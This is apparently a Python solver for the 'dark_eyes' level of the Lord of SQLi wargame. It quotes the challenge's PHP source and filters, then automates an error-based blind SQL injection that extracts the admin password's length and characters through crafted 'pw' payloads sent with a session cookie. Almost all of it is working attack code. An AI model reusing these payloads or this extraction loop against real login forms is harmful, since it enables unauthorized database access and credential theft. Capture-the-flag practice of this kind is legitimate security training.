import requests
import string
import time
"""
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
"""

url = "https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php" 
leng=1
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
strings = string.printable
def find_unicode(i,start=0, end=300):
    time.sleep(0.5)
    mid = (end+start)//2
    #print(mid,end)
    payload = {"pw":"' or id='admin' and ord(substr(pw,"+str(i+1)+",1)) > "+str(mid)+" or  (select 1 union select pw))# "}
    r = requests.get(url,params=payload,cookies=cookie)
    #print(r.text)
    if len(r.text)==0:
        if abs(end-mid) <=1 :
            return end
        else:
            return find_unicode(i,mid,end)
    else:
        if abs(end-mid) <=1 :
            return mid
        else:
            return find_unicode(i,start,mid)

while True:
    try:
        payload = {"pw":"' or id='admin' and (length(pw)="+str(leng)+" or  (select 1 union select pw))# "}
        r = requests.get(url, params=payload, cookies=cookie)
    except:
        print("error")
        break
    if len(r.text)!=0:
        print(leng)
        break
    leng +=1

password= ""
for i in range(leng):
    for j in strings:
        payload = {"pw":"' or id='admin' and (ord(substr(pw,"+str(i+1)+",1)) = "+str(ord(j))+" or  (select 1 union select pw))# "}
        r = requests.get(url,params=payload,cookies=cookie)
        if len(r.text)!=0:
            password += j
            print("found {}".format(password))
            if len(password) == leng:
                r = requests.get(url,params={"pw":password},cookies=cookie)
                if "Clear" in r.text:
                    print("clear")
                    break
            
